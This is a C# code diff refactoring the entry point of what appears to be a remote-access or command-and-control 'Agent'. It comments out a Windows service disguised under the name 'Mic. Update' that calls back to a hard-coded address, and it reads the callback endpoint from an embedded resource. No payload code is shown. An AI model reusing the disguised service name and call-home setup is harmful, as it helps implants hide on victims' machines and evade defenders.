@@ -16,76 +16,75 @@ using System.ServiceProcess;
 
 namespace Agent
 {
-    class Program
+    public class Entry
     {
-#if SERVICE
-        #region Nested classes to support running as service
-        public const string ServiceName = "Mic. Update";
+        //#if SERVICE
+        //        #region Nested classes to support running as service
+        //        public const string ServiceName = "Mic. Update";
 
-        public class Service : ServiceBase
-        {
-            public Service()
-            {
-                ServiceName = Program.ServiceName;
-            }
+        //        public class Service : ServiceBase
+        //        {
+        //            public Service()
+        //            {
+        //                ServiceName = Program.ServiceName;
+        //            }
 
-            protected override void OnStart(string[] args)
-            {
-                args = new string[] { "http://172.16.1.100:85" };
-                Program.Start(args);
-            }
+        //            protected override void OnStart(string[] args)
+        //            {
+        //                args = new string[] { "http://172.16.1.100:85" };
+        //                Program.Start(args);
+        //            }
 
-            protected override void OnStop()
-            {
-                Program.Stop();
-            }
-        }
-        #endregion
+        //            protected override void OnStop()
+        //            {
+        //                Program.Stop();
+        //            }
+        //        }
+        //        #endregion
+        //#endif
+
+        //        static void Main(string[] args)
+        //        {
+        //#if SERVICE
+        //            // running as service
+        //            using (var service = new Service())
+        //                ServiceBase.Run(service);
+        //#else
+        //            // running as console app
+        //            Start(args);
+        //#endif
+
+        //        }
+
+#if DEBUG
+        static string[] _args = new string[0];
 #endif
 
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
-#if SERVICE
-            // running as service
-            using (var service = new Service())
-                ServiceBase.Run(service);
-#else
-            // running as console app
-            Start(args);
+#if DEBUG
+            _args = args;
+            Start();
 #endif
-
         }
+
 
 
         static Thread s_agentThread = null;
 
-        private static void Start(string[] args)
+        public static void Start()
         {
-
+            string connUrl = Properties.Resources.EndPoint;
 
 #if DEBUG
             Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));
+
+            if (_args.Count() != 0)
+                connUrl = _args[0];
 #endif
-
-#if DEBUG
-            if (args.Count() == 0)
-                args = new string[] { "https://127.0.0.1:443" };
-            //args = new string[] { "pipe://192.168.56.103:aaaaaaaaaa" };
-            //args = new string[] { "tcps://127.0.0.1:4545" };
-            //args = new string[] { "pipes://127.0.0.1:foo" };
-#endif
-
-#if SERVICE
-
-#endif
-            if (args.Count() == 0)
-            {
-                Debug.WriteLine("No Endpoint set, quitting...");
-                return;
-            }
-
-            string connUrl = args[0];
             var connexion = ConnexionUrl.FromString(connUrl);
+
+            Debug.WriteLine($"Endpoint is {connUrl}.");
 
             if (!connexion.IsValid)
             {
